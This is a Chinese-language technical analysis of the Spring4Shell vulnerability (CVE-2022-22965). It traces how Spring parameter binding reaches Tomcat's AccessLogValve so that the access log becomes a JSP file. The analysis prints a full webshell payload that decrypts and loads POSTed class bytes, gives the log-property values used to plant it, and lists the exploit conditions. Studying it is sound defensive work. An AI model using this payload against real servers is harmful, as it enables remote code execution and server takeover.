# Spring 远程命令执行漏洞（CVE-2022-22965）分析
#漏洞分析/Spring

## 漏洞分析：

使用如下的poc进行请求。

![](./images/1.png)

从`org.springframework.web.bind.WebDataBinder#doBind`的入口进行，获取到我们请求的需要绑定的五个参数
![](./images/2.png)

跟入`org.springframework.beans.AbstractPropertyAccessor#setPropertyValues`遍历我们传入的所有参数进行`setPropertyValue`操作
![](./images/3.png)
跟入到`org.springframework.beans.AbstractNestablePropertyAccessor#getPropertyAccessorForPropertyPath`，该方法通过递归调用自身，实现对
`class.module.classLoader.resources.context.parent.pipeline.first.directory`递归解析，设置整个调用链
![](./images/4.png)
先去尝试获取到class的值
![](./images/5.png)
调用到了`org.springframework.beans.BeanWrapperImpl#getLocalPropertyHandler`去获取到class的对象bean
![](./images/6.png)
传入到`org.springframework.beans.BeanWrapperImpl.BeanPropertyHandler#getValue`中调用对象的**getClass()**方法
![](./images/7.png)
等价于获取到Greeting类的的Class实例。
1. 可以看到`class`嵌套参数最终通过反射调用`greeting`的父类`java.lang.Object.getClass()`，获得返回`java.lang.Class` 实例。
![](./images/8.png)
2. 同理：第二次迭代去解析，`module` 嵌套参数最终通过反射调`java.lang.Class.getModule() `，获得返回`java.lang.Module`实例。
![](./images/9.png)
3. 第三次迭代去解析:`classLoader`嵌套参数最终通过反射调用`java.lang.Module.getClassLoader() `，获得返回`org.apache.catalina.loader.ParallelWebappClassLoader`实例

4. 第四次迭代去解析:`resources`嵌套参数最终通过反射调用`org.apache.catalina.loader.WebappClassLoaderBase.getResources()`，获得返回的`org.apache.catalina.webresources.StandardRoot`

以此类推：
5. `org.apache.catalina.webresources.StandardRoot.getContext`获取到
`org.apache.catalina.core.StandardContext`

6. `org.apache.catalina.core.StandardContext.getParent()`获取到
`org.apache.catalina.core.StandardHost`

7. `org.apache.catalina.core.StandardHost.getPipeline()`获取到
`org.apache.catalina.core.StandardPipeline`

8. `org.apache.catalina.core.StandardPipeline.getFirst()`获取到`org.apache.catalina.valves.AccessLogValve`


9. 最后反射调用到`org.apache.catalina.valves.AccessLogValve.setDirectory()`进行设置日志保存目录为`webapps/ROOT`
![](./images/10.png)
- - - -
使用如下的poc进行请求
![](./images/11.png)

### `pattern`设置
pattern进行赋值:
```
<%{challenge}i@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%{challenge}i><%{challenge}i!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%{challenge}i><%{challenge}iif (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%{challenge}i><!—。
```
`%{challenge}i`会读取http头中challenge字段的值进行替换。
最后保存的webshell为
```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%><!-- 
```

### `suffix`文件后缀设置
suffix赋值为.jsp
### `prefix`文件名前缀设置
prefix赋值为inject
### `fileDateFormat`文件名日期格式设置
fileDateFormat赋值为83568

## 小结
通过请求传入的参数，利用Spring参数绑定机制，控制了Tomcat AccessLogValve的属性，让Tomcat在webapps/ROOT目录输出定制的“访问日志”inject 83568.jsp，该“访问日志”实际上为一个JSP webshell。



## 漏洞利用关键点一
- - - -
从`java.lang.Module`到`org.apache.catalina.loader.ParallelWebappClassLoader`，是将调用链转移到Tomcat，并最终利用AccessLogValve输出webshell的关键。
`ParallelWebappClassLoader`在Web应用以war包部署到Tomcat中时使用到。
![](./images/12.png)

---------

使用SpringBoot可执行jar包的方式运行Web应用，在这种方式下，我们看下classLoader嵌套参数被解析成什么，如下图：
![](./images/13.png)
可以看到，使用SpringBoot可执行jar包的方式运行，classLoader嵌套参数被解析为`org.springframework.boot.loader.LaunchedURLClassLoader`，查看其源码，没有getResources()方法。

- - - -
同理使用springboot直接启动，classLoader嵌套参数被解析为`jdk.internal.loader.ClassLoaders.AppClassLoader`
![](./images/14.png)



这就是本漏洞利用条件之一，**Web应用部署方式需要是Tomcat war包部署**。

## 漏洞利用关键点二
- - - -
**需要JDK版本>=1.9**
在`org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults`中去获取bean的成员变量时，会过滤掉class类的`classLoader`和`protectionDomain`，这样我们就调用不到class的`getClassLoader()`方法了
![](./images/15.png)
所以在此处的一个绕过方式就是利用JDK9以上新增加的`module`类，能绕过上述的校验并成功获取到classLoader类。
![](./images/16.png)
- - - -
最后写webshell成功。
![](./images/17.png)


## 参考
[Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考](https://paper.seebug.org/1877)